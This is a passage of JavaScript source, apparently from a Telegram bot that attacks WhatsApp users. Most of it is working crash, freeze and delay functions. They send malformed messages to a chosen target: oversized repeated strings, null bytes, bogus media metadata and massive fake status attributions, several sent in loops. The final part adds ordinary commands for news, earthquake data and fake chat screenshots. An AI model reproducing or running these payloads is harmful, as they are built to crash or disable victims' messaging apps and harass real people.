      mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
      fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
      directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1776937541",
      jpegThumbnail: null,
      caption: "MakLoo¡!",
      scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
      scanLengths: [
        9999999999999999999,
        9999999999999999999,
        9999999999999999999,
        9999999999999999999
      ],
      midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
    },
};

const msg = generateWAMessageFromContent(target, MakLo, {});

await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

//Fc Click
async function CrashMakLo(target) {
 await sock.relayMessage(target, {
     interactiveMessage: {
       body: {
         text: "MakLo(RcB)"
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "booking_confirmation",
                 ParamsJson: "\u0003".repeat(90000),
               },
             ],
           },
         },
       }, { participant: { jid: target }});
     }
async function denmark(target, ptcp) {
await sock.relayMessage(target, {
viewOnceMessage: {
message: {
interactiveMessage: {
body: { text: "Pou The Explorer" },
footer: { text: "Pou Executor" },
contextInfo: {},
nativeFlowMessage: {
buttons: [
{
name: "booking_confirmation",
buttonParamsJson: JSON.stringify({
booking_id: "POUXNXX123",
status: "confirmed",
business_name: "Pou Exposing",
service_name: "kontolMakLoeh",
appointment_time: "2026-04-28T10:00:00Z",
customer: {
name: "PouMods",
phone: "6283131354890"
}
})
}
],
messageParamsJson: "{".repeat(9999)
}
}
}
}
},
ptcp? {
participant: { jid: target }
}:{})
}

//Freeze
async function lockmessages(sock, target) {
    const zephyrineMessages = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩",

                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 9007199254740991,
                                mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                                fileName: "\u0001",
                                fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                                directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1723855952",
                                contactVcard: true,
                                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                jpegThumbnail: Buffer.alloc(0)
                            },

                            hasMediaAttachment: true
                        },

                        body: {
                            text: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩"
                        },

                        nativeFlowMessage: {
                            messageParamsJson: "{".repeat(10000),

                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify({
                                        title: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩",
                                        sections: [{ title: "\r", rows: [] }]
                                    })
                                },
                                {
                                    name: "payment_method",
                                    buttonParamsJson: "\u0010".repeat(2500)
                                },
                                {
                                    name: "call_permission_request",
                                    buttonParamsJson: "{}"
                                },
                                {
                                    name: "payment_method",
                                    buttonParamsJson: "{}"
                                },
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify({
                                        title: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩",
                                        sections: [{
                                            title: "\"\r".repeat(99999),
                                            rows: []
                                        }]
                                    })
                                },
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: JSON.stringify({
                                        flow_action: "navigate",
                                        flow_action_payload: {
                                            screen: "WELCOME_SCREEN"
                                        },
                                        flow_cta: "\"\r".repeat(99999),
                                        flow_id: "1169834181134583",
                                        flow_message_version: "3",
                                        flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
                                    })
                                },
                                {
                                    name: "mpm",
                                    buttonParamsJson: "{}"
                                }
                            ]
                        }
                    }
                }
            }
        },
        {
            userJid: target,
            quoted: null
        }
    );

    await sock.relayMessage(
        target,
        zephyrineMessages.message,
        {
            messageId: zephyrineMessages.key.id,
            participant: { jid: target },
            userJid: target
        }
    );
}

async function infinityfrezee(sock, target) {
  let zephyrine = [];

  const opts = {
    hasMediaAttachment: false
  };

  for (let i = 0; i < 15; i++) {
    zephyrine.push({
      header: opts,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000)
      }
    });
  }

  const viewOnceMessages = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "\u{2014} \u{1D419}\u{1D6B5}\u{1D413}\u{1D407}\u{1D418}\u{1D411}\u{1D408}\u{1D40D}\u{1D404}' \u{1D412}\u{1D408}\u{1D40D}\u{1D408}\u{1D412}\u{1D413}\u{1D400}\u{1D411}' \u{F8FF}" },
            footer: { text: "\u{2014} \u{1D419}\u{1D6B5}\u{1D413}\u{1D407}\u{1D418}\u{1D411}\u{1D408}\u{1D40D}\u{1D404}' \u{1D412}\u{1D408}\u{1D40D}\u{1D408}\u{1D412}\u{1D413}\u{1D400}\u{1D411}' \u{F8FF}" },
            carouselMessage: {
              cards: zephyrine,
              messageVersion: 1
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(target, viewOnceMessages.message, {
    messageId: viewOnceMessages.key.id,
    participant: { jid: target }
  });
}

async function frezeespam(sock, target) {
  let zephyrine = [];
  zephyrine.push({
    name: "single_select",
    buttonParamsJson: JSON.stringify({})
  });
  
  for (let i = 0; i < 150; i++) {
    zephyrine.push({
      name: "address_message",
      buttonParamsJson: JSON.stringify({ status: true })
    });
  }
  
  let message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "\u{2014} \u{1D419}\u{1D6B5}\u{1D413}\u{1D407}\u{1D418}\u{1D411}\u{1D408}\u{1D40D}\u{1D404}' \u{1D412}\u{1D408}\u{1D40D}\u{1D408}\u{1D412}\u{1D413}\u{1D400}\u{1D411}' \u{F8FF}"
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
            buttons: zephyrine
          }
        }
      }
    }
  };
  
  await sock.relayMessage(target, message, {
    messageId: null, participant: { jid: target }
  });
}
async function frzInt(target) {
  sock.relayMessage(target, {
    interactiveResponseMessage: {
      body: {
        text: "7eppsynC",
        format: 1
      },
      contextInfo: {
        participant: "13135550302@s.whatsapp.net",
        quotedMessage: {
          protocolMessage: {
            type: 25
          }
        },
        remoteJid: "status@broadcast"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"wa_flow_response_params\":{\"title\":${"𑇂𑆵𑆴𑆿".repeat(60000)},\"flow_id\":\"floww\"}}`,
        version: 3
      }
    }
  }, {
    participant: { jid: target }
  })
}
async function AmbaCrashCursor(sock, target) {
  await sock.relayMessage(target, {
    botInvokeMessage: {
      message: {
        newsletterAdminInviteMessage: {
          newsletterJid: "9999999@newsletter",
          newsletterName: "𑇂𑆵𑆴𑆿".repeat(30000),
          caption: "#— AmbaJahat ⚘\n" + "𑇂𑆵𑆴𑆿".repeat(30000),
          inviteExpiration: Date.now() + 86400000,
          jpegThumbnail: Buffer.from([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01, 0xFF, 0xC0, 0x00, 0x11, 0x08, 0xFF, 0xFF, 0xFF, 0xFF])
        }
      }
    }
  }, { participant: { jid: target } });
}

//Blank
async function crashVisible(sock, target) {
    for (let i = 0; i < 8; i++) {
        try {
            const virtex = "ꦾ".repeat(2800) + "\n".repeat(9200) + "\u200E".repeat(6800);
            const msg = {
                groupStatusMessageV2: {
                    message: {
                        header: {
                            locationMessage: {
                                degreesLatitude: -1,
                                degreesLongitude: -1,
                                name: virtex + " AreoLockedYou",
                                url: "https://mmg.net/" + "\n".repeat(25000) + "X".repeat(18000)
                            }
                        },
                        interactiveResponseMessage: {
                            body: { text: "\u0000" + "𑇂𑆵𑆴𑆿".repeat(12000) },
                            nativeFlowResponseMessage: {
                                name: "call_permission_request",
                                paramsJson: "{".repeat(15000) + "source:app".repeat(100) + "}".repeat(12000),
                                version: 3
                            }
                        }
                    }
                }
            };

            await sock.relayMessage(target, msg, {
                messageId: "INV-CRASH-" + Date.now(),
                statusJidList: [target],
                additionalNodes: [
                    { tag: "meta", attrs: { status_setting: "all" }, content: [{ tag: "mentioned_users", content: [{ tag: "to", attrs: { jid: target }}]}]},
                    {
                        tag: "call",
                        attrs: { to: target, id: Date.now().toString(), type: "offer" },
                        content: [{ tag: "offer", attrs: { "call-id": crypto.randomBytes(24).toString("hex") }}]
                    }
                ]
            });

            console.log(`🚀`);
            await new Promise(r => setTimeout(r, 1800));

        } catch (e) {
            console.log("Error:", e.message);
        }
    }
}
async function BlankInvisibleNewByMiaa(sock, target) {
const startTime = Date.now();
const duration = 1 * 60 * 1000;
while (Date.now() - startTime < duration) {
  await sock.relayMessage(
    target,
    {
  groupStatusMessageV2: { 
    message: {
      interactiveResponseMessage: {
        body: {
          text: "Mau DiSlash Queen Mia??",
          format: "DEFAULT",
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{\"values\":{\"in_pin_code\":\"x\",\"building_name\":\"ampos\",\"address\":\"/MakLo\",\"tower_number\":\"bokep\",\"city\":\"MakLo\",\"name\":\"CRB\",\"phone_number\":\"x\",\"house_number\":\"x\",\"floor_number\":\"x\",\"state\":\"${"\u0000".repeat(2000)}\"}}`,
          version: 3
        },
        contextInfo: {
          remoteJid: Math.random().toString(36) + "\u0000".repeat(1000),
          isForwarded: true,
          forwardingScore: 9999,
          statusAttributionType: 2,
            statusAttributions: Array.from({ length: 199999 }, (_, n) => ({
              participant: `62${n + 836598}@s.whatsapp.net`,
              type: 1
            })),
        },
      },
    },
  },
}, { participant: { jid: target }});
}
}
async function BlankInvisibleNewByMia(sock, target) {
  const startTime = Date.now();
  const duration = 1 * 60 * 1000;
  while (Date.now() - startTime < duration) {
    await sock.relayMessage("status@broadcast", {
      interactiveResponseMessage: {
        body: {
          text: "Eazy Slash By Queen Miaa",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: "\u0000".repeat(5000),
          version: 3
        },
        contextInfo: {
          remoteJid: Math.random().toString(36) + "\u0000".repeat(1000),
          isForwarded: true,
          forwardingScore: 9999,
          statusAttributionType: 2,
            statusAttributions: Array.from({ length: 199999 }, (_, n) => ({
              participant: `62${n + 836598}@s.whatsapp.net`,
              type: 1
            })),
         },
       },
     }, {
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: { status_setting: "contacts" },
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: []
                }
              ]
            }
          ]
        }
      ]
    });
  }
}


//Ui
async function docTui(target) {
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      header: {
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/633031390_1383276777150434_8923610466015577306_n.enc?ccb=11-4&oh=01_Q5Aa4QFX0uOgcHWom3TemAvu0lBC7_G7n_pQlnsHsfGRm6iLcw&oe=6A1E5BCD&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/pdf",
          fileSha256: "Rr2RNRSd9/WBO9mgWjJ5zU/hwMygLCRtQStkj9enR0E=",
          fileLength: 99999999999999999999,
          pageCount: 9999999999999999999,
          mediaKey: "MfjslWT93s2Uw6AoIkHOvneDPsmYgmc40AAIUh4ikdE=",
          fileName: "👁‍🗨⃟꙰。⃝7epp ‌ TsynC‌⃰ꪸ⃟‼️",
          fileEncSha256: "2hQRRBtAFgsGCTe9lfFaLOdPBmoI2F9MmdmtpG9zZ14=",
          directPath: "/v/t62.7119-24/633031390_1383276777150434_8923610466015577306_n.enc?ccb=11-4&oh=01_Q5Aa4QFX0uOgcHWom3TemAvu0lBC7_G7n_pQlnsHsfGRm6iLcw&oe=6A1E5BCD&_nc_sid=5e03e0",
          thunbnailDirectPath: "/v/t62.7118-24/637626696_962473390083315_2714448408348223871_n.enc?ccb=11-4&oh=01_Q5Aa4QHOV9A1k-crTeAbQu0Bdt6BSkczTgRlbv1mn4zjiQ_xqQ&oe=6A1E57B1&_nc_sid=5e03e0",
          thumbnailSha256: "SCl48OhqZPQXWJ60s3hdNUEuFyiETAAULIUkEkYPFTY=",
          thumbnailEncSha256: "ykWGPzHbMH9fBb8Z59YlkgX4clA5ZxsvZVQ+o7OB/FM=",
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAxAAADAQEBAQAAAAAAAAAAAAAAAwUEAgEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAPpc2rzj6pCFm3XEdOVgxLpqogMonsUplW8ixR4zaF7k1sDaqIDovrrKhbMrr5uXcHDyf6xRQPCoJDMkZ6Wzd4DO0tu+NW9WdFGMZa2QG1WpYNDrKDQ1rCfozgJed//EACgQAAICAgEDAwMFAAAAAAAAAAECAAMREgQTITEQIjIUQVEgIyRhgf/aAAgBAQABPwC6hHQgiUXdAip/8PpZclcblK4Kzi9JUwv6eRSliSvksNqn8gSrW1nLRjgmUOQ2oPmdF8H3mce+yu/pO3b0JjqX7ZwJ0FAM3NVhinjWHYnEpQNflPiJmcgfy6sfn0B7f3BkiMpj8Ws5g4S/kxK1rAAEaMAeQh9HGpzFMusZB7VzHtvJ+JlDEVjfzMgiWNqpM46m+/b7L6MoYYMFirZpPIjJjxNBEGue85lx+AlF6UIo1iOrgEGCxdtfvOaRXbsplXMY4GIeVZnXWG3kFcrgwJyGGS2IaXawgHMYsMgmcC1vqNc+2fuM5dfMvR1ybJRRaylx4EVtwAR3ErLq3YRrLDmCx0XGvc/eWpWtZJGWMr2qbdPMVwncyxzzLVQSupa0Cy9GovGPBgscZ0Hczq2K52inYAzkWhK9TDYon//EACARAQACAQQCAwAAAAAAAAAAAAEAAhEQITFBAwQSInH/2gAIAQIBAT8Ai9ErdzvC2XTmWrxiFXsIu5o7OYwma/Ld08ltuJVRB4l6A94l/HKXqGMzvEsCH6T2frhIGaytKz//xAAiEQACAgEDBAMAAAAAAAAAAAABAgARAxAhMQQSQWEyUXH/2gAIAQMBAT8AEclSAOTEzNdGdvvTiZVZyCORFRiRYAi+dVIEMLqgonc6dRaqKED5GFbBvHuYizgzL03ebDG5jyKFoniZOP2ZfgT9RM7oFArmNuImFTc//9k=",
          mediaKeyTimestamp: 1777790813,
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: {
              botJid: "867051314767696@bot"
            },
            forwardOrigin: 4
          },
          contactVcard: true
        },
        hasMediaAttachment: true
      },
      body: {
        text: "👁‍🗨⃟꙰。⃝7epp ‌ TsynC‌⃰ꪸ⃟‼️" + "ꦾ".repeat(60000)
      },
      nativeFlowMessage: {
        messageParamsJson: "{}",
        buttons: [{
          name: "single_select",
          buttonParamsJson: JSON.stringify({
            title: "👁‍🗨⃟꙰。⃝𝐗𝐳𝐂 ‌ 𝐂𝐨𝐫𝐩𝐨𝐫𝐚𝐭𝐢𝐨𝐧‌⃰ ⌁ꪸ⃟‼️⃟༚Ꮡ⭑‌",
            icon: "DOCUMENT"
          })
        }],
        messageVersion: 3
      }
    }
  }, {});
  await WaSocket.relayMessage(target, msg.message, {
    participant: { jid: target }
  })
}

async function Qcurl(sock, target) {
while (true) {
for (let r = 0; r < 150; r++) {
  const Love4You = {
    groupStatusMessageV2: {
      message: {
        header: {
         stickerMessage: {
           url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
           fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
           fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
           mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
           mimetype: "image/webp",
           directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
            fileLength: "10610",
            mediaKeyTimestamp: "1775044724",
            stickerSentTs: "1775044724091"
           },
            hasMediaAttachment: true
        },
        extendedTextMessage: {
        url: null,
          paymentLinkMetadata: {
            provider: { paramsJson: "[{".repeat(300000) },
            header: { headerType: 1 }
          },
          contextInfo: {
            remoteJid: Math.random().toString(36) + "REQUEST_PAYMENT",
            isForwarded: true,
            forwardingScore: 999,
            externalAdReply: {},
            quotedMessage: { contactsArrayMessage: { contacts: [] } },
            paymentExtendedMetadata: {
              type: 1,
              platform: "windowshortcut"
            },
            urlTrackingMap: {
             urlTrackingMapElements: Array.from({ length: 280000 }, () => ({
              "\u200B": "\u0000"
                }))
              },
            businessMessageForwardInfo: {
              businessOwnerJid: target
            }
          },
          body: {
            text: "\x10".repeat(150000)
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "view_order",
                buttonParamsJson: "\u0000"
              },
              {
                name: "address_message",
                buttonParamsJson: "\u0000"
              },
              {
                name: "single_select",
                buttonParamsJson: "\u0000"
              },
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "PROMOTION",
                  flow_cta: "ꦽ".repeat(150000),
                  flow_message_version: "3"
                })
              }
            ]
          }
        }
      }
    }
  };
  await sock.relayMessage(target, Love4You, {
    messageId: crypto.randomBytes(16).toString('hex').toUpperCase(),
    participant: { jid: target },
    userJid: target
  });
  await new Promise((r) => setTimeout(r, 1500));
    }
  }
}

//DelayHard
async function R9X(sock, target) {
  var R9X = generateWAMessageFromContent(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "R9X",
            format: "EXTENSION"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"R9X\",\"address\":\"R9X\",\"tower_number\":\"R9X\",\"city\":\"Japanese\",\"name\":\"R9X\",\"phone_number\":\"555555\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"R9X | ${"\u0000".repeat(900000)}\"}}`,
            version: 3
          }
        }
      }
    }
  }, { userJid: target });

  await sock.relayMessage(target, R9X.message, {
    participant: { jid: target },
    messageId: R9X.key.id
  });
}
async function DelayHardV9(sock, target) {
  const startTime = Date.now();
  const duration = 1 * 60 * 1000;
  while (Date.now() - startTime < duration) {
    await sock.relayMessage("status@broadcast", {
      interactiveResponseMessage: {
        body: {
          text: "Ampos !¡",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: "\u0000".repeat(5000),
          version: 3
        },
        contextInfo: {
          remoteJid: Math.random().toString(36) + "\u0000".repeat(1000),
          isForwarded: true,
          forwardingScore: 9999,
          statusAttributionType: 2,
            statusAttributions: Array.from({ length: 199999 }, (_, n) => ({
              participant: `62${n + 836598}@s.whatsapp.net`,
              type: 1
            })),
         },
       },
     }, {
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: { status_setting: "contacts" },
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: []
                }
              ]
            }
          ]
        }
      ]
    });
  }
}

//DelayXbulldozer
async function delayHardV10(sock, target) {
const startTime = Date.now();
const duration = 1 * 60 * 1000;
while (Date.now() - startTime < duration) {
  await sock.relayMessage(
    target,
    {
  groupStatusMessageV2: { 
    message: {
      interactiveResponseMessage: {
        body: {
          text: "MakLuu",
          format: "DEFAULT",
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{\"values\":{\"in_pin_code\":\"x\",\"building_name\":\"ampos\",\"address\":\"/MakLo\",\"tower_number\":\"bokep\",\"city\":\"MakLo\",\"name\":\"CRB\",\"phone_number\":\"x\",\"house_number\":\"x\",\"floor_number\":\"x\",\"state\":\"${"\u0000".repeat(2000)}\"}}`,
          version: 3
        },
        contextInfo: {
          remoteJid: Math.random().toString(36) + "\u0000".repeat(1000),
          isForwarded: true,
          forwardingScore: 9999,
          statusAttributionType: 2,
            statusAttributions: Array.from({ length: 199999 }, (_, n) => ({
              participant: `62${n + 836598}@s.whatsapp.net`,
              type: 1
            })),
        },
      },
    },
  },
}, { participant: { jid: target }});
}
}
async function DelayXBuldozer(sock, target) {
const Mmk = {
      groupStatusMentionMessage: {
        message: {
          imageMessage: {
            url: "https://mmg.net/" + "\u0000".repeat(12003) + "A".repeat(12003) + "=69F4950B&_nc_sid=e6ed6c&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
            fileLength: "9999999999999",
            mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
            directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc",
            height: -720,
            width: -720,
            statusAttributionType: 4,
            contextInfo: {
              forwardedNewsletterMessageInfo: {
                newsletterJid: "001@newsletter",
                serverMessageId: -1,
                newsletterName: "\u0000",
                contentType: 1,
                accessibilityText: "X",
                profileName: "\u0000"
              },
              quotedMessage: {
                locationMessage: {
                  name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
                  address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000)
                }
              },
              statusAttribution: [
                {
                  type: 3,
                  music: {
                    title: "\u0000".repeat(15000),
                    author: "R",
                    songId: "NULL"
                  }
                },
                {
                  statusAttribution: {
                    type: 5,
                    groupStatus: {
                      authorJid: "000000@s.whatsapp.net"
                    }
                  }
                }
              ]
            }
          }
        }
      }
    };

const Kntl = {
      groupStatusMessageV2: {
        message: {
          viewOnceMessage: {
            message: {
              interactiveResponseMessage: {
                body: {
                  text: "RxTzy",
                  format: 1
                },
                nativeFlowResponseMessage: {
                  name: "galaxy_message",
                  paramsJson: "\u0000".repeat(990000),
                  wa_flow_response_params: {
                    title: " ".repeat(12000)
                  }
                }
              }
            }
          }
        }
      }
    };

await sock.relayMessage(target, Mmk, { participant: { jid: target } });
await sock.relayMessage(target, Kntl, { participant: { jid: target } });
}


















//Tools
bot.onText(/^\/iqc(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const msgId = msg.message_id;
  const textMsg = match[1];

  if (!textMsg) {
    return bot.sendMessage(
      chatId,
      "🪧 Format salah.\n\nContoh:\n`/iqc Name | 21:45 | 77 | TELKOMSEL`",
      {
        parse_mode: "Markdown",
        reply_to_message_id: msgId
      }
    ).catch(() => {});
  }

  const parts = textMsg.split("|").map(p => p.trim());
  const text = parts[0];
  const time = parts[1] || "00:00";
  const battery = parts[2] || "100";
  const carrier = parts[3] || "TELKOMSEL";

  const apiUrl =
    `https://brat.siputzx.my.id/iphone-quoted?` +
    `time=${encodeURIComponent(time)}` +
    `&messageText=${encodeURIComponent(text)}` +
    `&carrierName=${encodeURIComponent(carrier)}` +
    `&batteryPercentage=${encodeURIComponent(battery)}` +
    `&signalStrength=4&emojiStyle=apple`;

  try {
    await bot.sendChatAction(chatId, "upload_photo").catch(() => {});

    const response = await axios.get(apiUrl, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);
    
    await bot.sendPhoto(
      chatId,
      buffer,
      {
        caption:
`\`\`\`
⬡═⊱ TRIDENTS XNULL ⊰═⬡
━━━━━━━━━━━━━━━━━━━━⟢
「 ⚆ 」IPhone Generate
━━━━━━━━━━━━━━━━━━━━⟢
Chat : \`${text}\`
Time : ${time}
Baterry : ${battery}%
Kartu : ${carrier}
━━━━━━━━━━━━━━━━━━━⟢
\`\`\``,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "「 αµƭɦσɾ 」", url: "https://t.me/Putxzyy" }]
          ]
        },
        reply_to_message_id: msgId
      }
    );

  } catch (e) {
    console.error("❌ Error:", e.message);
    bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat memproses gambar.",
      { reply_to_message_id: msgId }
    ).catch(() => {});
  }
});

bot.onText(/^\/dunia$/, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, "🌍 Sedang mengambil berita dunia...");

  try {
    const url = "https://feeds.bbci.co.uk/news/world/rss.xml";
    const res = await fetch(url);
    const xml = await res.text();
      
    // Ambil 5 judul dan link pertama pakai regex
    const items = [...xml.matchAll(/<item>.*?<title><!\[CDATA\[(.*?)\]\]><\/title>.*?<link>(.*?)<\/link>/gs)]
      .slice(0, 5)
      .map(m => `• [${m[1]}](${m[2]})`)
      .join("\n\n");
      
    if (!items) throw new Error("Data kosong");
      
    const message = `🌎 *Berita Dunia Terbaru*\n\n${items}\n\n📰 _Sumber: ©Jarzx News_`;
    await bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
  } catch (e) {
    console.error(e);
    await bot.sendMessage(chatId, "⚠️ Gagal mengambil berita dunia. Coba lagi nanti.");
  }
});

bot.onText(/\/gempa/, async (msg) => {
  const chatId = msg.chat.id;
  try {
    const res = await fetch("https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json");
    const data = await res.json();
    const gempa = data.Infogempa.gempa;
    const info = `
📢 *Info Gempa Terbaru BMKG*
📅 Tanggal: ${gempa.Tanggal}
🕒 Waktu: ${gempa.Jam}
📍 Lokasi: ${gempa.Wilayah}
📊 Magnitudo: ${gempa.Magnitude}
📌 Kedalaman: ${gempa.Kedalaman}
🌊 Potensi: ${gempa.Potensi}
🧭 Koordinat: ${gempa.Coordinates}
🗺️ *Dirasakan:* ${gempa.Dirasakan || "-"}
Sumber: ©Jarzx
    `;
    bot.sendMessage(chatId, info, { parse_mode: "Markdown" });
  } catch (err) {
    bot.sendMessage(chatId, "⚠️ Gagal mengambil data gempa dari BMKG.");
  }
});


bot.onText(/^\/chatowner(?:\s+(.+))?/, async (msg, match) => {
  try {
    const OWNER_ID = 1274275039; // Ganti dengan ID owner kamu
    const userId = msg.from.id;
    const chatId = msg.chat.id;
    const text = (match[1] || "").trim();
    const name = msg.from.first_name || "Tanpa Nama";

    if (!text)
      return bot.sendMessage(chatId, "⚠️ Format salah.\nGunakan: /chatowner <isi permintaan fitur>");

    const message = `
📩 *Permintaan Fitur Baru*  
👤 Dari: ${name}  
🆔 ID: ${userId}  

💬 Pesan:  
${text}
    `;

    await bot.sendMessage(OWNER_ID, message, { parse_mode: "Markdown" });
    await bot.sendMessage(chatId, "✅ Permintaan fitur kamu sudah dikirim ke owner.");
  } catch (err) {
    console.error("❌ Error di /reqfitur:", err.message);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengirim permintaan fitur.");
  }
});
bot.onText(/\/TesFunc (.+) (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
